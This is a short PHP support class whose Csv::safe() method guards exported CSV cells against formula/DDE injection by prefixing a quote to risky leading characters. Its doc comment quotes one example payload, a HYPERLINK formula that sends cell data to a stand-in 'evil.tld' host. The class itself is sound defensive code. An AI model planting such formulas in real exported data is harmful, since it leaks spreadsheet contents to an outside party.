<?php

declare(strict_types=1);

namespace App\Support;

/**
 * CSV output helpers.
 */
class Csv
{
    /**
     * Neutralize CSV formula / DDE injection (CWE-1236).
     *
     * A cell whose first character is one of = + - @ (or a leading tab /
     * carriage return) is interpreted as a formula by Excel / LibreOffice /
     * Google Sheets when the exported file is opened. A contact named
     * `=HYPERLINK("http://evil.tld"&A1,"x")` would then execute. Prefixing a
     * single quote forces the spreadsheet to treat the value as text; the
     * quote itself is not displayed.
     */
    public static function safe(?string $value): string
    {
        $value = (string) $value;

        if ($value !== '' && in_array($value[0], ['=', '+', '-', '@', "\t", "\r"], true)) {
            return "'".$value;
        }

        return $value;
    }
}
